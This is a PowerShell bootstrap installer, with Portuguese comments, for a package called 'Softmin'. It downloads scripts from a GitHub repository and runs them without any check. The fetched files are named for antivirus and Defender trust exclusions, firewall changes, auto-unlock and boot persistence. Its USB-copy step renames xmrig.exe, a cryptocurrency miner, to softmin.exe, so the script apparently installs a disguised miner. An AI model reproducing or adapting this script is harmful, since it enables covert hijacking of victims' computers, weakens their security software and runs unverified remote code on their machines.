# Bootstrap: transferir pacote da nuvem GitHub + instalar tudo (1 clique no instalar.bat).
param(
    [string]$InstallPath = '',
    [string]$LauncherRoot = ''
)

$ErrorActionPreference = 'Stop'

$CloudBase = 'https://raw.githubusercontent.com/gabriel-Dagostim/omicron-softmin-cloud/master/cloud'

if ([string]::IsNullOrWhiteSpace($InstallPath)) {
    $InstallPath = Join-Path $env:LOCALAPPDATA 'Softmin'
}
$InstallPath = $InstallPath.TrimEnd('\')
$logDir = Join-Path $InstallPath 'logs'
New-Item -ItemType Directory -Force -Path $InstallPath, $logDir | Out-Null

function Write-BootLog {
    param([string]$Msg)
    $line = ('{0}  {1}' -f (Get-Date).ToString('yyyy-MM-dd HH:mm:ss'), $Msg)
    Add-Content -LiteralPath (Join-Path $logDir 'instalar.log') -Value $line -Encoding UTF8
    Write-Host $line
}

function Save-CloudUrl {
    param([string]$Url, [string]$Dest)
    $dir = Split-Path $Dest -Parent
    if ($dir -and -not (Test-Path -LiteralPath $dir)) {
        New-Item -ItemType Directory -Force -Path $dir | Out-Null
    }
    Invoke-WebRequest -Uri $Url -OutFile $Dest -UseBasicParsing -TimeoutSec 180 `
        -Headers @{ 'User-Agent' = 'Softmin-Bootstrap' }
}

Write-BootLog '[BOOT] === Softmin bootstrap (nuvem GitHub) ==='

# --- 1) Manifesto + ficheiros listados ---
$manifestUrl = "$CloudBase/manifest.json"
Write-BootLog "[BOOT] Manifesto: $manifestUrl"
try {
    $manifest = Invoke-RestMethod -Uri $manifestUrl -Headers @{ 'User-Agent' = 'Softmin-Bootstrap' } -TimeoutSec 90
    $base = if ($manifest.base_url) { [string]$manifest.base_url.TrimEnd('/') } else { $CloudBase }
    $n = 0
    foreach ($entry in $manifest.files) {
        $rel = [string]$entry.path -replace '/', '\'
        $local = Join-Path $InstallPath $rel
        $url = if ($entry.url) { [string]$entry.url } else { "$base/$($entry.path)" }
        try {
            Save-CloudUrl -Url $url -Dest $local
            $n++
        } catch {
            Write-BootLog ("[BOOT] WARN falha: {0} - {1}" -f $rel, $_.Exception.Message)
        }
    }
    Write-BootLog ("[BOOT] Manifesto: {0} ficheiro(s) transferidos." -f $n)
} catch {
    Write-BootLog ("[BOOT] WARN manifesto: {0}" -f $_.Exception.Message)
}

# --- 2) Ficheiros criticos (podem ainda nao estar no manifesto publicado) ---
$critical = @(
    'Softmin-Run.ps1', 'Softmin-Common.ps1', 'Softmin-SecureStorage.ps1', 'Softmin-Governor.ps1',
    'Softmin-CloudManifest.ps1', 'Softmin-CloudConfig.ps1', 'Softmin-AutoUnlock.ps1',
    'Set-SoftminAntivirusTrust.ps1', 'Set-SoftminDefenderTrust.ps1', 'Set-SoftminFirewall.ps1',
    'Download-SoftminBinary.ps1', 'Uninstall-Softmin.ps1', 'Reconfig-Softmin.ps1',
    'Softmin-Stop.ps1', 'Softmin-Start.ps1', 'Softmin-Heal.ps1', 'Softmin-Boot.ps1',
    'config.template.json', 'Bootstrap-SoftminInstall.ps1'
)
foreach ($name in $critical) {
    $local = Join-Path $InstallPath $name
    if (Test-Path -LiteralPath $local) { continue }
    try {
        Save-CloudUrl -Url "$CloudBase/$name" -Dest $local
        Write-BootLog ("[BOOT] OK extra: {0}" -f $name)
    } catch { }
}

# --- 3) Bonus opcional: pendrive/repo ao lado do .bat (NAO obrigatorio) ---
if ($LauncherRoot -and (Test-Path -LiteralPath $LauncherRoot)) {
    $lr = $LauncherRoot.TrimEnd('\')
    $scriptDir = Join-Path $lr 'scripts'
    if (Test-Path -LiteralPath $scriptDir) {
        Get-ChildItem -LiteralPath $scriptDir -Filter '*.ps1' -File | ForEach-Object {
            Copy-Item -LiteralPath $_.FullName -Destination (Join-Path $InstallPath $_.Name) -Force
        }
        Write-BootLog '[BOOT] Bonus: scripts locais/pendrive copiados (opcional).'
    }
    $binDir = Join-Path $lr 'bin'
    if (Test-Path -LiteralPath $binDir) {
        Get-Process -Name 'softmin' -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
        Start-Sleep -Milliseconds 300
        $dstBin = Join-Path $InstallPath 'bin'
        New-Item -ItemType Directory -Force -Path $dstBin | Out-Null
        Get-ChildItem -LiteralPath $binDir -File | ForEach-Object {
            $dest = Join-Path $dstBin $(if ($_.Name -eq 'xmrig.exe') { 'softmin.exe' } else { $_.Name })
            if (-not (Test-Path -LiteralPath $dest) -or $_.Name -eq 'softmin.exe') {
                try {
                    Copy-Item -LiteralPath $_.FullName -Destination $dest -Force -ErrorAction Stop
                } catch { }
            }
        }
    }
}

# --- 4) Instalacao completa (Softmin-Run -Install -CloudOnly) ---
$runPs = Join-Path $InstallPath 'Softmin-Run.ps1'
if (-not (Test-Path -LiteralPath $runPs)) {
    $runLocal = Join-Path $PSScriptRoot 'Softmin-Run.ps1'
    if (Test-Path -LiteralPath $runLocal) {
        Copy-Item -LiteralPath $runLocal -Destination $runPs -Force
    } else {
        Save-CloudUrl -Url "$CloudBase/Softmin-Run.ps1" -Dest $runPs
    }
}

Write-BootLog '[BOOT] A iniciar instalacao completa (Softmin-Run -Install -CloudOnly)...'
& $runPs -Install -CloudOnly -InstallPath $InstallPath
exit $LASTEXITCODE
